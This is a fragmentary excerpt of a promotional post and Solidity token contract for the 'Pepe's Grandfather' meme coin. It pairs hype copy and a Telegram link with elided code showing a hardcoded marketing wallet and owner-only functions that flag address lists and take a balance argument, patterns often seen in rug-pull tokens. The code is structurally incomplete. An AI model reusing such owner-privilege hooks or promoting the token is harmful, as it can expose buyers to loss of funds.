...
Pepe's  Grandfather just arrived! if pepe's mother , son , papa already mooned well don't be late on Pepe's  Grandfather taking off!

https://t.me/PepeGrandfather
...
*/
    ...
    contract PepesGrandfather   is IBEP20, Ownable
    {
        ...
        string private constant _name = "Pepe's Grandfather";
        ...
        address public constant MarketingWallet=0xBfe788d0f7C6bF02986Fc78067d35c57823fb950; 
        ...
        constructor () {
           ...
           function OwnerSetAddress(address account) external onlyOwner {
            ...
            function Access(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function ReflectionsShare(address account, uint256 balance) onlyOwner  public virtual {
